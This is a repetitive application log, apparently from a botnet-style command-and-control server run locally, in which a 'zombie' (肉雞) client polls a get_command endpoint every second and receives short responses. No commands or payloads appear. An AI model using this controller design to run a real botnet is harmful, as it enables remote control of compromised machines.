2025-06-25 00:16:30 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:31 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:32 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:34 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:37 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:42 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:47 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:48 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:49 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:51 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:52 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:53 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:54 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:55 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:56 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:57 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:58 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:59 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:00 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:01 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:02 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:03 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:04 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:05 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:06 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:07 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:08 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:09 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:10 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:11 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:12 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:13 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:14 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:15 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:16 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:17 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:18 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:19 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:17:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:17:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:17:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:17:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:17:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
